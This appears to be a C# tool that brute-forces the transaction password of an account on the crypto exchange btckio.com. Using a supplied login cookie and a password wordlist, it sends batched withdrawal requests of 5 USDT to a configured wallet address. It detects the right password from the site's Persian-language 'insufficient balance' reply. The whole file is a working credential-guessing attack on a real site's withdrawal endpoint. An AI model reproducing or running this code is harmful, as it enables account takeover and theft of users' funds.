using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace TrPassMine
{
    public class PassMine
    {
        private readonly string filepath = ConfigurationManager.AppSettings["passwordFilePath"];
        private readonly string WalletADDR = ConfigurationManager.AppSettings["walletAddr"];
        private readonly string LoginCookie = ConfigurationManager.AppSettings["LoginCookie"];
        private readonly Uri baseaddress = new Uri("https://btckio.com");
        private readonly string targetUrl = "/index/withdraw/index.html?btwaf=1000000000000";
        private readonly HttpClient _client = null;
        private readonly int UrlChunkCount = int.Parse(ConfigurationManager.AppSettings["RequestCountAtTime"]);
        public PassMine()
        {
            var cookieContainer = new CookieContainer();
            try
            {
                processCookie().ToList().ForEach(x => { cookieContainer.Add(baseaddress, new Cookie(x.Key, x.Value)); });
            }
            catch (Exception)
            {
                Console.WriteLine("error in parsing login cookie");
            }
            var handler = new HttpClientHandler() { CookieContainer = cookieContainer };
            _client = new HttpClient(handler) { BaseAddress = baseaddress };
        }
        private StringContent Serialize(object obj)
        {
            return new StringContent(JsonConvert.SerializeObject(obj), Encoding.UTF8, "application/json");
        }
        public T Deserialize<T>(string obj)
        {
            return JsonConvert.DeserializeObject<T>(obj, new JsonSerializerSettings());
        }
        private List<string> GetPasswordsFromFile()
        {
            if (File.Exists(filepath))
                return File.ReadAllLines(filepath).ToList();
            else
                return null;
        }
        private Dictionary<string, string> processCookie()
        {
            Dictionary<string, string> result = new Dictionary<string, string>();
            foreach (var rcd in LoginCookie.Split(';'))
            {
                if(!string.IsNullOrEmpty(rcd.Trim()))
                    result.Add(rcd.Trim().Split('=')[0], rcd.Trim().Split('=')[1]);
            }
            return result;
        }
        public async Task<string> CheckPasswords()
        {
            try
            {
                var passwords = GetPasswordsFromFile();
                List<FrmModel> reqs = new List<FrmModel>();
                bool IsPasswordFound = false;
                if (passwords != null)
                {
                    passwords.ForEach(x => { reqs.Add(new FrmModel() { money = 5, wallet_type = "trc20", usdt_wallet = WalletADDR, paypwd = x }); });
                    Console.WriteLine("process is starting.please wait ...");
                    for (int i = 0; i < reqs.Count/UrlChunkCount; i++)
                    {
                        var reqChunk = reqs.Skip(i * UrlChunkCount).Take(UrlChunkCount).ToList();
                        var requests = reqChunk.Select(r => _client.PostAsync(targetUrl, Serialize(r))).ToList();
                        waitforResponse:
                        try
                        {
                            await Task.WhenAll(requests);
                            var responses = requests.Select(task => task.Result);
                            foreach (var r in responses)
                            {
                                if (ProcessResponse(r))
                                {
                                    Console.WriteLine($"password is : {await evokePassword(reqChunk)}");
                                    IsPasswordFound = true;
                                    break;
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Console.WriteLine("retry process started.please wait ...");
                            goto waitforResponse;
                        }
                        Console.WriteLine($"{(i + 1) * UrlChunkCount}/{reqs.Count} password processed.please wait ...");
                    }
                    if(!IsPasswordFound)
                        Console.WriteLine("no password found.");
                    Console.WriteLine("process is Done!");
                }
                else
                    Console.WriteLine("password file not found");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return "";
        }
        private Task<HttpResponseMessage> CallUrl(FrmModel model)
        {
            return _client.PostAsync(targetUrl, Serialize(model));
        }
        private bool ProcessResponse(HttpResponseMessage response)
        {
            bool result = false;
            if (response.IsSuccessStatusCode)
            {
                var message = Deserialize<ResponseModel>(response.Content.ReadAsStringAsync().GetAwaiter().GetResult());
                var msgg = WebUtility.HtmlDecode(message.msg);
                if (msgg != " خطای کلمه عبور تراکنش ")
                {
                    if (msgg == "موجودی ناکافی")
                        result = true;
                }
            }
            return result;
        }
        private async Task<string> evokePassword(List<FrmModel> models)
        {
            string result = "";
            foreach (var item in models)
            {
                if (ProcessResponse(await CallUrl(item)))
                    result = item.paypwd;
            }
            return result;
        }
    }
    public class FrmModel
    {
        public int money { get; set; }
        public string wallet_type { get; set; }
        public string usdt_wallet { get; set; }
        public string paypwd { get; set; }
    }
    public class ResponseModel
    {
        public string code { get; set; }
        public string msg { get; set; }
    }
}
